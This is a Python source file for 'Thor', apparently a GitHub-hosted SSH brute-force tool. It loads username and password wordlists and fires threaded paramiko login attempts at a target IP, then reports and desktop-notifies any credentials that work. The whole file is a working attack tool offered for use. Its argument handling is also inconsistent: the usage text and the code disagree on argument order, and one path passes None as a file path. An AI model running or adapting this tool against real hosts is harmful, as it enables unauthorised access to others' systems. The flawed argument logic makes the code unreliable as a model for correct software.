#By SxNade
#https://github.com/SxNade/Thor
#CONTRIBUTE
#BRUTEFORCE___SSH

import paramiko
import os
import sys
import socket
import threading
import time
from termcolor import colored

exit_tag = 0
hammer = '''
 -------
/ SxNade|
\       /
 ---||--
    ||
    ||
    ||
    ||
    ...`
     '''

logo = '''
 ________           
/_  __/ /  ___  ____
 / / / _ \/ _ \/ __/
/_/ /_//_/\___/_/           
                         
           *By SxNade https://github.com/SxNade :: SxNade@protonmail.com
'''
print(logo)
time.sleep(1.5)
print("\n\nThor v2.1a starting...")
os.system("notify-send 'Thor Successfully initiated'")
time.sleep(2)

if len(sys.argv) < 4 or len(sys.argv) > 5:
    print(colored("\n[*]usage python3 thor.py <ip> <password-file> <username-file (optional)>\n\n", 'white', attrs=['reverse', 'blink']))
    sys.exit(0)

target_ip = sys.argv[1]
username_file = sys.argv[2]
password_file = sys.argv[3] if len(sys.argv) == 4 else None
#Grabing the required variables...

#Defning A SSH connect Function to start SSH session Against Target...
def ssh_connect(username, password, code=0):
    global exit_tag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    #checking for each user in list, every correct password in List
    try:
        ssh.connect(target_ip, port=22, username=username, password=password)
        exit_tag = 1
        print(colored(f"\n[+]SSH Password For {username} found :> {password}    {hammer}\n", "green", attrs=['bold']))
        os.system(f"notify-send 'Password Found::{password} for User::{username}'")
    except:
        print(colored(f"[!]Incorrect SSH password for {username} with password: {password}", 'red'))
    ssh.close()

if not os.path.exists(password_file):
    print(colored("[!] Password File Not Found", 'red'))
    sys.exit(1)

if username_file and not os.path.exists(username_file):
    print(colored("[!] Username File Not Found", 'red'))
    sys.exit(1)

passwords = []
with open(password_file, 'r') as file:
    passwords = [line.strip() for line in file.readlines()]

usernames = []
if username_file:
    with open(username_file, 'r') as file:
        usernames = [line.strip() for line in file.readlines()]
else:
    usernames.append(sys.argv[2])

for username in usernames:
    for password in passwords:
        if exit_tag == 1:
            break
        t = threading.Thread(target=ssh_connect, args=(username, password,))
        t.start()
        #starting threading on ssh_connect function which takes only one argument of password...
        time.sleep(0.5)
        #time in seconds between each successive thread//Don't change it unless very neccessary...!
        #Lowering this time value may cause some errors......!
